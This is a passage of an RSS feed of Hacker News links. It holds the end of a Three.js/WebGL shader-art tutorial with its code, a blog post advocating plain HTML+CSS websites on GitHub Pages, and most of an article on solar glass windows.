            u_veinDefinition<span>:</span> <span>{</span>type<span>:</span> <span>'f'</span><span>,</span> value<span>:</span> <span>20</span> <span>}</span><span>,</span>
            u_goCrazy<span>:</span> <span>{</span> type<span>:</span> <span>'t'</span><span>,</span> value<span>:</span> <span>1</span> <span>}</span><span>,</span>
            u_inputTexture<span>:</span> <span>{</span>type<span>:</span> <span>'t'</span><span>,</span> value<span>:</span> lion<span>}</span><span>,</span>
            u_scale<span>:</span> <span>{</span>type<span>:</span> <span>'f'</span><span>,</span> value<span>:</span> <span>0.85</span> <span>}</span><span>,</span>
            u_clickLength<span>:</span> <span>{</span> type<span>:</span> <span>'f'</span><span>,</span> value<span>:</span> <span>1</span><span>}</span><span>,</span>
            u_rand<span>:</span> <span>{</span> type<span>:</span> <span>'f'</span><span>,</span> value<span>:</span> <span>randomInteger</span><span>(</span><span>0</span><span>,</span> <span>10</span><span>)</span> <span>}</span><span>,</span>
            u_rand<span>:</span> <span>{</span>type<span>:</span> <span>'f'</span><span>,</span> value<span>:</span> <span>new</span> <span>THREE<span>.</span>Vector2</span><span>(</span><span>randomInteger</span><span>(</span><span>6</span><span>,</span> <span>10</span><span>)</span><span>,</span> <span>randomInteger</span><span>(</span><span>8</span><span>,</span> <span>10</span><span>)</span><span>)</span> <span>}</span>
        <span>}</span><span>,</span>
        fragmentShader<span>:</span> noise <span>+</span> fragment<span>,</span>
        vertexShader<span>:</span> noise <span>+</span> vertex<span>,</span>
    <span>}</span><span>)</span><span>;</span>
    
    <span>let</span> mesh <span>=</span> <span>new</span> <span>THREE<span>.</span>Mesh</span><span>(</span>geometry<span>,</span> material<span>)</span><span>;</span>
    mesh<span>.</span><span>position</span><span>.</span><span>set</span><span>(</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>-</span><span>300</span><span>)</span><span>;</span>
    scene<span>.</span><span>add</span><span>(</span>mesh<span>)</span><span>;</span>

    
    
    
    <span>const</span> <span>animate</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
        <span>requestAnimationFrame</span><span>(</span> animate <span>)</span><span>;</span>
        renderer<span>.</span><span>render</span><span>(</span> scene<span>,</span> camera <span>)</span><span>;</span>
        <span>document</span><span>.</span><span>body</span><span>.</span><span>appendChild</span><span>(</span>renderer<span>.</span><span>domElement</span><span>)</span><span>;</span>
        mesh<span>.</span><span>material</span><span>.</span><span>uniforms</span><span>.</span><span>u_time</span><span>.</span><span>value</span> <span>=</span> t<span>;</span>
        <span>if</span><span>(</span>t <span>&amp;</span>lt<span>;</span> <span>10</span> <span>&amp;</span>amp<span>;</span><span>&amp;</span>amp<span>;</span> backtrack <span>==</span> <span>false</span><span>)</span> <span>{</span>
            t <span>=</span> t <span>+</span> <span>0.005</span><span>;</span>
        <span>}</span> <span>else</span> <span>{</span>
            backtrack <span>=</span> <span>true</span><span>;</span>
            t <span>=</span> t <span>-</span> <span>0.005</span><span>;</span>
            <span>if</span><span>(</span>t <span>&amp;</span>lt<span>;</span> <span>0</span><span>)</span> <span>{</span>
                backtrack <span>=</span> <span>false</span><span>;</span>
            <span>}</span>
        <span>}</span>
    <span>}</span><span>;</span>

</code></pre>
<p>I haven't included all the details, but here are some of the key points:
</p><ul>
    <li>The uniform variables in <code>uniforms: {}</code> are passed directly to the shader code we will write. When we update these, it will allow us to live update our 3d object.</li>
    <li>The shaders locations are mentioned in the ShaderMaterial() function</li>
    <li>We then request an animation frame to re-render the 3d object. Notice in the animate() function we increase t (time) and the uniform variable, creating the animation</li>
</ul>

<h2>Step 2. Shaders</h2>
<p>If you are unfamiliar with what shaders are, they essentially allow you to manipulate the color of a geometry and the position of a geometry. There are two types of shaders, fragments (for colors) and vertex (for positions). <strong>These alter the shape before it is rendered.</strong></p>
<p>For this tutorial our main focus is the fragment shader. We will be using noise to generate the liquid effect, and the specific noise we will be using is called fractal brownian noise (FBM). An example of the noise created by FBM is shown below:</p>
<p><img src="https://fjolt.com/images/misc/231220201.webp" alt="Image of fractal brownian noise"></p>
<p>Don't worry, you don't need to know how to create these noise effects, and in fact one <a href="https://en.wikipedia.org/wiki/Perlin_noise">won an oscar</a>. The full code for these noise functions are available online and you can find the ones we will use in the GitHub Repo for this demo, in the <code>shaders/</code> folder.</p>
<p>Our vertex shader is the pretty simple, so lets focus on the fragment shader. The code (with comments) is shown below:</p>
<pre><p>shell <span>Copy</span></p><code>

// Main <span>function</span>
void <span>main</span><span>(</span><span>)</span> <span>{</span>
    // We have to adjust the effect to fit our resolution.
    // Heavily modified FBM <span>function</span> from https://thebookofshaders.com/13/
    vec2 res <span>=</span> <span>(</span>gl_FragCoord.xy + <span>100</span>.<span>)</span> / <span>(</span>u_resolution.xy * u_scale<span>)</span><span>;</span>
    
    // Next lets get our colors
    vec3 highColor <span>=</span> rgb<span>(</span>u_highColor.r, u_highColor.g, u_highColor.b<span>)</span><span>;</span>
    vec3 lowColor <span>=</span> rgb<span>(</span>u_lowColor.r, u_lowColor.g, u_lowColor.b<span>)</span><span>;</span>
    
    // Set a random color
    vec3 color <span>=</span> vec3<span>(</span><span>23.0</span><span>)</span><span>;</span>

    // This is a randomised <span>function</span> based on fbm and some other variables
    // that we can adjust <span>in</span> our Javascript
    vec2 fbm1 <span>=</span> vec2<span>(</span><span>10</span>.<span>)</span><span>;</span>
    fbm1.x <span>=</span> fbm<span>(</span> res + <span>0.05</span> * u_time<span>)</span> * snoise<span>(</span>res<span>)</span> * u_goCrazy<span>;</span>
    fbm1.y <span>=</span> fbm<span>(</span> res + vec2<span>(</span><span>3.0</span><span>))</span> / <span>(</span>u_manipulate - snoise<span>(</span>res<span>))</span> * <span>9</span>. * u_goCrazy / u_veinDefinition * u_clickLength * <span>5</span>.<span>;</span>

    // Next we adjust it all based on mouse position, time, and qfbm1
    vec2 r <span>=</span> vec2<span>(</span><span>0</span>.<span>)</span><span>;</span>
    r.x <span>=</span> fbm<span>(</span> res + fbm1 * u_time * <span>0.1</span> <span>)</span> + -sin<span>(</span>u_mouse.x<span>)</span> + <span>600</span>.<span>;</span>
    r.y <span>=</span> fbm<span>(</span> res + fbm1 * u_time * <span>0.5</span> <span>)</span> * -u_mouse.y<span>;</span>

    // And create a float of fbm, <span>for</span> <span>use</span> <span>in</span> the final color
    float f <span>=</span> fbm<span>(</span>res+r<span>)</span> * <span>1</span>.<span>;</span>

    // Then we mix all our colors together
    color <span>=</span> mix<span>(</span>highColor*2., lowColor, f*3.<span>)</span><span>;</span>
    color <span>=</span> mix<span>(</span>color, lowColor, clamp<span>(</span>length<span>(</span>fbm1<span>)</span>,0.0,2.0<span>))</span><span>;</span> // * snoise<span>(</span>st<span>)</span> * <span>51.9</span>
    color <span>=</span> mix<span>(</span>color, highColor, clamp<span>(</span>length<span>(</span>r.y<span>)</span>,0.0,3.0<span>))</span><span>;</span>

    // And output them <span>for</span> render
    gl_FragColor <span>=</span> vec4<span>((</span>f*f*f*0.9*f*f+.5*f<span>)</span>*color,1.<span>)</span><span>;</span>
<span>}</span>
    
</code></pre>
<p>The cool thing about this particular fragment shader is that it renders as a cool stylised art effect for our demo, but if we increase the settings it can also double as a pretty simple liquid water fragment shader.</p>
<p>Our uniform variables are all defined at the top of the fragment shader but not listed above. They are listed in the form <code>uniform float u_variableName;</code>. 

</p><h2>Step 3. Event Listeners</h2>
<p>Finally, we add some typical event listeners to our code to track mouse position, as well as the range selector positions. This allows us to adjust the effect and animate it as the user moves around.</p>
<p>This is perhaps the most straightfoward and vanilla JS part. For the most part, we are simply updating the uniform variables through the mesh we defined before - <code>mesh.material.uniforms...</code>. When these are updated, our <code>animate()</code> function rerenders the new object in our HTML5 canvas, so our cursor position and interaction with the canvas has real time effects on the WebGL code.</p>
<pre><p>javascript <span>Copy</span></p><code>

    
    <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'range'</span><span>)</span><span>.</span><span>addEventListener</span><span>(</span><span>'input'</span><span>,</span> <span>function</span><span>(</span><span>e</span><span>)</span> <span>{</span>
        
        mesh<span>.</span><span>material</span><span>.</span><span>uniforms</span><span>.</span><span>u_manipulate</span><span>.</span><span>value</span> <span>=</span> <span>this</span><span>.</span><span>value</span><span>;</span>
    <span>}</span><span>)</span>
    <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'veins'</span><span>)</span><span>.</span><span>addEventListener</span><span>(</span><span>'input'</span><span>,</span> <span>function</span><span>(</span><span>e</span><span>)</span> <span>{</span>
        
        mesh<span>.</span><span>material</span><span>.</span><span>uniforms</span><span>.</span><span>u_veinDefinition</span><span>.</span><span>value</span> <span>=</span> <span>this</span><span>.</span><span>value</span><span>;</span>
    <span>}</span><span>)</span>
    <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'crazy'</span><span>)</span><span>.</span><span>addEventListener</span><span>(</span><span>'input'</span><span>,</span> <span>function</span><span>(</span><span>e</span><span>)</span> <span>{</span>
        
        mesh<span>.</span><span>material</span><span>.</span><span>uniforms</span><span>.</span><span>u_goCrazy</span><span>.</span><span>value</span> <span>=</span> <span>this</span><span>.</span><span>value</span><span>;</span>
    <span>}</span><span>)</span>

    <span>document</span><span>.</span><span>querySelectorAll</span><span>(</span><span>'.color'</span><span>)</span><span>.</span><span>forEach</span><span>(</span><span>function</span><span>(</span><span>item</span><span>)</span> <span>{</span>
        
        item<span>.</span><span>addEventListener</span><span>(</span><span>'click'</span><span>,</span> <span>function</span><span>(</span><span>e</span><span>)</span> <span>{</span>
            <span>let</span> i <span>=</span> <span>parseFloat</span><span>(</span><span>this</span><span>.</span><span>getAttribute</span><span>(</span><span>'data-id'</span><span>)</span><span>)</span><span>;</span>
            mesh<span>.</span><span>material</span><span>.</span><span>uniforms</span><span>.</span><span>u_highColor</span><span>.</span><span>value</span> <span>=</span> config<span>.</span><span>colors</span><span>[</span>i<span>]</span><span>.</span><span>high</span><span>;</span>
            mesh<span>.</span><span>material</span><span>.</span><span>uniforms</span><span>.</span><span>u_lowColor</span><span>.</span><span>value</span> <span>=</span> config<span>.</span><span>colors</span><span>[</span>i<span>]</span><span>.</span><span>low</span><span>;</span>
        <span>}</span><span>)</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>

    
    <span>let</span> reduceVector<span>;</span>
    <span>let</span> increasePressure<span>;</span>
    <span>let</span> reducePressure<span>;</span>
    <span>let</span> prevX <span>=</span> <span>0</span><span>;</span>
    <span>let</span> prevY <span>=</span> <span>0</span><span>;</span>
    <span>let</span> curValueX <span>=</span> <span>0</span><span>;</span>
    <span>let</span> curValueY <span>=</span> <span>0</span><span>;</span>
    <span>let</span> mouseEnterX <span>=</span> <span>0</span><span>;</span>
    <span>let</span> mouseEnterY <span>=</span> <span>0</span><span>;</span>

    
    <span>document</span><span>.</span><span>body</span><span>.</span><span>addEventListener</span><span>(</span><span>'pointermove'</span><span>,</span> <span>function</span><span>(</span><span>e</span><span>)</span> <span>{</span>
        <span>if</span><span>(</span><span>typeof</span> reduceVector <span>!==</span> <span>"undefined"</span><span>)</span> <span>{</span>
            <span>clearInterval</span><span>(</span>reduceVector<span>)</span><span>;</span>
            curValueX <span>=</span> <span>0</span><span>;</span>
            curValueY <span>=</span> <span>0</span><span>;</span>
        <span>}</span>
        <span>let</span> mouseMoveX <span>=</span> mouseEnterX <span>-</span> e<span>.</span><span>pageX</span><span>;</span>
        <span>let</span> mouseMoveY <span>=</span> mouseEnterY <span>-</span> e<span>.</span><span>pageY</span><span>;</span>
        mesh<span>.</span><span>material</span><span>.</span><span>uniforms</span><span>.</span><span>u_mouse</span><span>.</span><span>value</span> <span>=</span> <span>new</span> <span>THREE<span>.</span>Vector2</span><span>(</span>prevX <span>+</span> <span>(</span>mouseMoveX <span>/</span> elWidth<span>)</span><span>,</span> prevY <span>+</span> <span>(</span>mouseMoveY <span>/</span> elHeight<span>)</span><span>)</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>
    
    
    <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'canvas'</span><span>)</span><span>.</span><span>addEventListener</span><span>(</span><span>'pointerdown'</span><span>,</span> <span>function</span><span>(</span><span>e</span><span>)</span> <span>{</span>
        <span>if</span><span>(</span><span>typeof</span> reducePressure <span>!==</span> <span>"undefined"</span><span>)</span> <span>clearInterval</span><span>(</span>reducePressure<span>)</span><span>;</span>
        increasePressure <span>=</span> <span>setInterval</span><span>(</span><span>function</span><span>(</span><span>)</span> <span>{</span>
            <span>if</span><span>(</span>mesh<span>.</span><span>material</span><span>.</span><span>uniforms</span><span>.</span><span>u_clickLength</span><span>.</span><span>value</span> <span>&amp;</span>lt<span>;</span> <span>3</span><span>)</span> <span>{</span>
                mesh<span>.</span><span>material</span><span>.</span><span>uniforms</span><span>.</span><span>u_clickLength</span><span>.</span><span>value</span> <span>+=</span> <span>0.03</span><span>;</span>
            <span>}</span>
        <span>}</span><span>,</span><span>1000</span><span>/</span><span>60</span><span>)</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>
    <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'canvas'</span><span>)</span><span>.</span><span>addEventListener</span><span>(</span><span>'pointerup'</span><span>,</span> <span>function</span><span>(</span><span>e</span><span>)</span> <span>{</span>
        <span>if</span><span>(</span><span>typeof</span> increasePressure <span>!==</span> <span>"undefined"</span><span>)</span> <span>clearInterval</span><span>(</span>increasePressure<span>)</span><span>;</span>
        reducePressure <span>=</span> <span>setInterval</span><span>(</span><span>function</span><span>(</span><span>)</span> <span>{</span>
            <span>if</span><span>(</span>mesh<span>.</span><span>material</span><span>.</span><span>uniforms</span><span>.</span><span>u_clickLength</span><span>.</span><span>value</span> <span>&amp;</span>gt<span>;</span> <span>1</span><span>)</span> <span>{</span>
                mesh<span>.</span><span>material</span><span>.</span><span>uniforms</span><span>.</span><span>u_clickLength</span><span>.</span><span>value</span> <span>-=</span> <span>0.03</span><span>;</span>
            <span>}</span>
        <span>}</span><span>,</span><span>1000</span><span>/</span><span>60</span><span>)</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>

</code></pre>

<h2>Conclusion</h2>
<p><strong>And we're done</strong>. After that, we have all of the different components needed to create this effect. Thanks for reading - you can find the resources including the full code below:</p>
<ul>
    <li><a href="https://github.com/smpnjn/webgl-art">Github Repo</a></li>
    <li><a href="https://codepen.io/smpnjn/pen/mdrBXQr">CodePen Demo</a></li>
</ul>
                
            </div>
            
        </article>
    </section></div>]]>
            </description>
            <link>https://fjolt.com/article/webgl-dynamic-art-background</link>
            <guid isPermaLink="false">hacker-news-small-sites-25520893</guid>
            <pubDate>Wed, 23 Dec 2020 19:06:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[“My stack will outlive yours”: Going back to raw HTML+CSS for websites and blogs]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25520658">thread link</a>) | @steren
<br/>
December 23, 2020 | https://blog.steren.fr/2020/my-stack-will-outlive-yours/ | <a href="https://web.archive.org/web/*/https://blog.steren.fr/2020/my-stack-will-outlive-yours/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
  <article>
	<header>
		
		<time date="2020-12-22">December 2020</time>
	</header>

		<p>
		My stack requires no maintenance, has perfect Lighthouse scores, will never have any security vulnerability, is based on open standards, is portable, has an instant dev loop, has no build step and… will outlive any other stack.
		</p>
		<p>
		It’s not LAMP, Wordpress, Rails, MEAN, Jamstack... I don’t do CSR (Client-side rendering), SSR (Server Side Rendering), SSG (Static Site Generation)...
		</p>
		<p>
		My stack is <b>HTML+CSS</b>.
		</p>
		<p>
		And because my sources are in git, pushed to GitHub, <a href="https://pages.github.com/">GitHub Pages</a> is my host.
		</p>
		<p>
		Of course, I’m being a bit provocative here. I should rather say that, for some specific use cases, I concluded that to get top performances and to guatantee long term support, HTML+CSS was the best choice, instead on relying on technologies currently more popular. Because I’m done rewriting my site every couple of years.
		</p>

		<h3>Why HTML+CSS?</h3>
		<p>
		It all started with <a href="https://labs.steren.fr/">a blog</a>, that I was hosting on Wordpress.com (which is "Wordpress-as-a-Service", because the last thing I want to do is administer a Wordpress installation on my own server). I <strong>paid</strong> Wordpress.com to do one job: host my blog. And one day I looked at its sources and Lighthouse scores:
		</p>
		<figure>
			<img src="https://blog.steren.fr/2020/my-stack-will-outlive-yours/wordpress-sources.png" alt="Sources of my Wordpress.com blog, showing a lot of inlined unreadable scripts">
			<figcaption>Sources of my Wordpress.com blog, what is all this?</figcaption>
		</figure>
		<figure>
			<img src="https://blog.steren.fr/2020/my-stack-will-outlive-yours/wordpress-lighthouse.png" alt="Lighthouse scores of my Wordpress.com blog, showing 19/100 for Performance">
			<figcaption>Lighthouse score of my blog hosted on Wordpress.com</figcaption>
		</figure>
		<p>
		What have we done?
		</p>
		<p>
		Sure, these are the problems of one specific blogging platform. I’m pretty sure others are better, at least in terms of performance. But isn’t there something fundamentally wrong if displaying a short text with images takes seconds, loads countless render-blocking scripts, and has unreadable sources?
		</p>
		<p>
		My requirements were:
		</p>
		<ol>
			<li>performance</li>
			<li>simplicity</li>
			<li>long long term support</li>
		</ol>
		<p>
		It was time to say goodbye to Wordpress. I didn’t need 99% of its features anyway. Other blogging platforms didn’t meet expectations either (I seriously have no idea why so many people publish on Medium… behind a login wall). I looked at static site generators like Jekyll, Hugo, 11ty, but all of these require tooling installed, have a build step and will ultimately need some updates or be abandonned by their maintainer. What if we also get rid of these?
		</p>
		<p>
		The best tool is no tool, the best build step is no build step, the best update is no update. HTML gives us all that, and more.
		</p>

		<figure>
			<img src="https://blog.steren.fr/2020/my-stack-will-outlive-yours/lighthouse-score-pure-html-css.svg" alt="Lighthouse score of 100">
			<figcaption>Lighthouse score of this page</figcaption>
		</figure>

		<h3>What is the HTML+CSS stack good for?</h3>
		<p>
		Let’s first differentiate between what I call a web <em>page</em> and a web <em>app</em>: The goal of a web <em>page</em> is to serve content, on the other hand, the goal of a web <em>app</em> is to enable the user to perform interactive tasks. Of course, there are in-betweens, often in the form of content that might need customization depending on the logged in user and content that might allow some interactions.
		</p>
		<p>
		HTML+CSS fits the web <em>page</em> use case. Wow, what a revelation! It might seem obvious, but it seems we’ve all forgotten this these days. HTML+CSS does not fit the web <em>app </em>use case, or any in between.
		</p>
		<p>
		We said a web <em>page</em> serves content, but let’s dive into more concrete use cases:
		</p>
		<ul>
			<li>Product / Company / Business landing page and marketing sites</li>
			<li>Personal portfolio / bio</li>
			<li>Blog</li>
			<li>Documentation</li>
		</ul>

		<h3>How to develop for HTML+CSS?</h3>
		<p>
		Authoring a pure HTML+CSS site can be done in any text editor, in any environment (any desktop OS, any smartphone, or even directly using GitHub’s single file editor) and previewed by simply opening the file in any browser.
		</p>
		<p>
		Keep the HTML of every page minimal and semantic. First, because there is no need for countless of &lt;div&gt;, but then because it makes sources more readable and easier to edit. See for example the <a href="https://github.com/steren/blog/blob/master/2020/my-stack-will-outlive-yours/index.html">HTML sources of this page</a>: a total of 150 lines, 100 lines are for the content, the rest is metadata and page structure, nothing extra. 
		</p>
		<p>
		For consistency, all pages that need to share the same style can point to the same CSS file. This avoids  duplication when it comes to styling (but note that loading this file creates an extra HTTP request, which could be avoided if style was inlined).
		</p>
		<p>
		When not cluttered with unnecessary scripts, divs or classes, I have no issue writing HTML directly. Yes, the paragraph tags are a bit annoying and distracting, but proper indentation and syntax highlighting mitigate this.
		<br>
		Sometimes, for drafting long blog articles, I’m working in Google Docs, and when I’m happy, export the content to clean HTML using an add-on. Google Docs is awesome for collaboration, with powerful suggestions and commenting system. That’s ideal for the “draft” phase. 
		<br>
		Because all content is in git, final review and approval can be done via GitHub pull requests.
		</p>
		<p>
		When I publish a new page, I need to link to it manually from the index page. I’m OK with that. It’s done in one line. It also allows me to have more control over when I want the page to be “published”.
		</p>
		<p>
		I don't need to pay for custom themes, I have complete freedom in the style and layout of my site.
		I can embed anything I want without being restricted by the choice of the hosting platform: SVG images, 3D models, interactive JS experiences. 
		</p>
		<p>
		Creating a new page requires to clone an existing one.
		So... if I don’t use any templating system, how do I update my header, footer or nav? Well, simply by using the ”Replace in files” feature of any good text editor. They don’t need frequent updates anyway. The benefits of using a templating system is not worth the cost of introducing the tooling it requires.
		</p>
		
		<h3>In conclusion</h3>
		<p>
		You don’t need  Wordpress, or Hugo to put a blog online, or Angular, React or Next.js to put a web page online. Raw HTML and CSS do the job.
		</p>
		<p>
		That being said, you’ll need to pick up some tooling or framework if you want to build a web app or add more interactivity or customization to your web pages. And for that, I’m very glad to see that frameworks now seem to be prioritizing performance, notably by prioritizing serving the content first and leveraging caching whenever possible. The era of “download 5MB of JS first and then download content from athe REST API” seems to be over for content web pages. (I personally think it’s still OK to do so for web apps, as the user’s intent and expectations are different).
		</p>
		<p>
		Is the “HTML+CSS only” approach a bit extreme? A bit, it’s basically saying “all software is terrible, how can minimize my dependencies on software”. Web standards are a model of backward compatibility. I’m pretty confident that my web pages written in raw HTML+CSS will have no issue being accessed and authored 10 years from now, without me having to do anything.
		</p>  
	</article>
</div></div>]]>
            </description>
            <link>https://blog.steren.fr/2020/my-stack-will-outlive-yours/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25520658</guid>
            <pubDate>Wed, 23 Dec 2020 18:44:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is Solar Glass the Future of Clean Energy in Cities?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25520589">thread link</a>) | @scottbucks
<br/>
December 23, 2020 | https://www.thedetechtor.com/post/solar-glass-energy-in-big-cities | <a href="https://web.archive.org/web/*/https://www.thedetechtor.com/post/solar-glass-energy-in-big-cities">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="8.7.1"><div dir="ltr"><div><h3 id="viewer-foo"><span><span>This technology can turn any window into an energy-generating panel</span></span></h3><div id="viewer-761ht"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.thedetechtor.com/post/solar-glass-energy-in-big-cities" data-pin-media="https://static.wixstatic.com/media/nsplsh_2f1962e8a60e41f8a571b853e38e7981~mv2.jpg/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/nsplsh_2f1962e8a60e41f8a571b853e38e7981~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-m9ue"><span>Photo-voltaic modules (otherwise known as <strong>Solar Panels</strong>)<!-- --> have been around for a while, allowing us to <!-- -->use <!-- -->sunlight<!-- --> as a source of energy<!-- -->. The issue with solar panels is that they need sufficient space on rooftops or on the ground to produce enough energy for them to be worth it, space that is limited in big cities. </span></p><p id="viewer-dkhis"><span>In recent years, companies have been working on a solution to this problem: <strong>Solar Glass</strong> (often referred to as "Solar Windows"), which can turn windows into power-generating panels.</span></p><h2 id="viewer-efmla"><span>What is Solar Glass?</span></h2><p id="viewer-8bpoh"><span>Solar glass is used to replace conventional <!-- -->building<!-- --> materials<!-- --> in parts such as the roof, skylights, facades and windows<!-- -->, whilst also generating electricity on-site.</span></p><p id="viewer-5gpt4"><span>The key difference between this recent technology and traditional solar PV (Photo-voltaic) is that the panels are built into the building rather than being added on. This allows for more of a relationship between aesthetics and functionality.</span></p><p id="viewer-5v8m5"><span>The most common type of Solar Glass is <strong>T</strong><strong>hin-film modules</strong> (e.g. amorphous silicon, cadmium telluride) which<!-- --> been around for a few years. They can be designed into the fabric of a building and can perform in conditions/locations where crystalline silicon panels (conventional solar panels) cannot. </span></p><p id="viewer-e6r4b"><span>This solar glass has a varying efficiency that depends on it's<!-- --> opacity which it's self varies between 50% transparent and fully opaque. The greater opacity they have, the more efficient they'll be, but on the other hand, being less transparent will allow less light to penetrate through.</span></p><h3 id="viewer-4um67"><span><span>Suggested Articles:</span></span></h3><ul><li id="viewer-49mml"><p><strong>🚄 </strong><a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><strong><u>Hyperloop, the future of travel?</u></strong></a></p></li><li id="viewer-f6604"><p><strong>📱 </strong><a href="https://www.thedetechtor.com/post/smartphones-the-true-cost-of-upgrades" target="_blank" rel="noopener"><strong><u>Smartphones: The True Cost of Upgrades</u></strong></a><strong> ♻️</strong></p></li><li id="viewer-6hik8"><p><span><strong>🏭 </strong></span><a href="https://www.thedetechtor.com/post/carbon-capture-usage-and-storage-the-solution-to-the-climate-crisis" target="_blank" rel="noopener"><strong><u>Carbon Capture, Usage and Storage: The Solution to the Climate Crisis?</u></strong></a></p></li></ul><h2 id="viewer-2oa4c"><span>Why use Solar Glass? </span></h2><p id="viewer-nkfr"><span>In the current state that the world is in, we need to start properly transitioning away from fossil fuels and towards renewable energy if we want to reduce our <a href="https://www.thedetechtor.com/post/carbon-capture-usage-and-storage-the-solution-to-the-climate-crisis" target="_blank" rel="noopener"><u>carbon emissions</u></a>. There are several options when it comes to renewable energy: <!-- -->Wind, Hydro, Tidal, Geothermal, Biomass and of course Solar energy.</span></p><p id="viewer-4befc"><span>Sunlight is one of our planet’s most abundant and freely available energy resources. The amount of solar energy that reaches the earth’s surface in one hour is more than the planet’s total energy requirements for a whole year so trying to harness that energy seems obvious.</span></p><p id="viewer-etkau"><span>Up until now, <!-- -->crystalline silicon Solar Panels have accounted <!-- -->opacity which it's self varies between 50% transparent and fully opaque. The greater opacity they have, the more efficient they'll be, but on the other hand, being less transparent will allow less light to penetrate through.</span></p><p id="viewer-36bae"><span>For big cities on the other hand, where most buildings are several stories high, close together and made primarily out of glass, there's simply not enough space, which is why solar glass, with the ability to turn these glass windows into energy-generating panels, seems like the perfect solution. </span></p><h3 id="viewer-6r5bk"><span>Other benefits to solar glass</span></h3><p id="viewer-dk9sg"><span>Other than producing electricity, solar glass offers several other benefits when <a href="https://www.spiritenergy.co.uk/kb-solar-glass-photovoltaic-windows" target="_blank" rel="noopener"><u>integrated into buildings</u></a>:</span></p><ul><li id="viewer-ccm8d"><p><strong>Transparency</strong> allows for light to penetrate the building whilst also providing <strong><span>shading and glare control</span></strong><span>.</span></p></li><li id="viewer-c9trm"><p>T<span>hanks to their multi-layer structure, Solar modules possess <strong>sound insulating properties</strong>. The insulation can even be adjusted by increasing or decreasing the thickness of the glazing.</span></p></li><li id="viewer-76vie"><p><span>Because the temperature of a PV module can increase significantly when the module is exposed to radiation, the heat it then radiates can be harnessed to provide <strong>t</strong></span><strong>hermal control</strong> like <strong>thermal insulation</strong>, <strong>reduction in thermal gain</strong>. </p></li><li id="viewer-9uuc2"><p><strong>Aesthetics</strong>: Different colours and effects can be applied to Solar Glass.</p></li></ul><h2 id="viewer-bamr9"><span>Where can it be used?</span></h2><p id="viewer-3r7su"><span>Solar Glass technology can be used in many different applications thanks to it's partial transparency making it much more versatile, for example:</span></p><ul><li id="viewer-bg9bs"><p><strong>Solar Windows</strong> are probably the most obvious way of using this technology, allowing skyscrapers for example to have power-generating facades.</p></li><li id="viewer-111bt"><p>Solar Glass can also be used for <strong>Bus Stops.</strong> </p></li></ul><ul><li id="viewer-4mp8j"><p><strong>Atriums</strong> and <strong>skylights.</strong></p></li><li id="viewer-11ues"><p>It's also perfect for <span><strong>privacy protection panels</strong> because it doesn't let in too much light seeing as it can only go up to 50% transparency.</span></p></li></ul><h2 id="viewer-6cqjg"><span><span>The Solar Glass pioneers </span></span></h2><p id="viewer-7jpbo"><span><span>There are many companies around the world working on making Solar Glass mainstream, here are some of the pioneers.</span></span></p><h3 id="viewer-fd55"><span><span>Ubiquitous Energy</span></span></h3><p id="viewer-1aokf"><span>First off there is <a href="https://ubiquitous.energy/" target="_blank" rel="noopener"><u>Ubiquitous Energy</u></a>, a Silicon Valley technology company leading the development of next-generation solar technologies. Born from research at MIT and Michigan State University, founded on the principle of seamlessly integrating solar technology into everyday products and surfaces. They have since developed a transparent solar coating that integrates into standard windows, with endless possibilities for future applications.</span></p><h3 id="viewer-enp20"><span>Physee</span></h3><p id="viewer-1n23a"><span>The European manufacturer <a href="https://www.physee.eu/" target="_blank" rel="noopener"><u>Physee</u></a> was actually the first to install transparent solar panels. The company developed a technology they call the "Power Bar" which is small solar panels that are installed along the window pane edges to generate power.</span></p><p id="viewer-dihln"><span>Physee is also working on <!-- -->power generating glass coating. It directs sunlight onto integrated solar cells in PowerWindows. Without impacting the transparency of its glass, windows will produce the same energy as 1/5 of a solar panel placed on a building's roof.</span></p><h2 id="viewer-dc5n2"><span>Bottom Line</span></h2><p id="viewer-igh5"><span>The bottom line is that, although this technology is not yet widely available and still in it's early stages, Solar Glass seems like a very promising new way to generate electricity from the sun. With companies continuing to innovate and improve their products, we may well be seeing our first Solar Glass buildings within the next decade, let's wait and see!</span></p><p id="viewer-58ct9"><span><strong>Sources:</strong></span></p><p id="viewer-8ll7g"><span><strong>- </strong><a href="https://www.spiritenergy.co.uk/kb-solar-glass-photovoltaic-windows" target="_blank" rel="noopener"><u>https://www.spiritenergy.co.uk/kb-solar-glass-photovoltaic-windows</u></a> </span></p><p id="viewer-97jl"><span><strong>- </strong><a href="https://ubiquitous.energy/about/" target="_blank" rel="noopener"><u>https://ubiquitous.energy/about/</u></a> </span></p><p id="viewer-8togt"><span>- <a href="https://www.physee.eu/innovation/coating" target="_blank" rel="noopener"><u>https://www.physee.eu/innovation/coating</u></a> </span></p><p id="viewer-570b8"><span>- <a href="https://solarmagazine.com/solar-panels/transparent-solar-panels/" target="_blank" rel="noopener"><u>https://solarmagazine.com/solar-panels/transparent-solar-panels/</u></a> </span></p><h3 id="viewer-40d8a"><span><span><strong>More from The Detechtor:</strong></span></span></h3><ul><li id="viewer-d442b"><p><strong>🚄 </strong><a 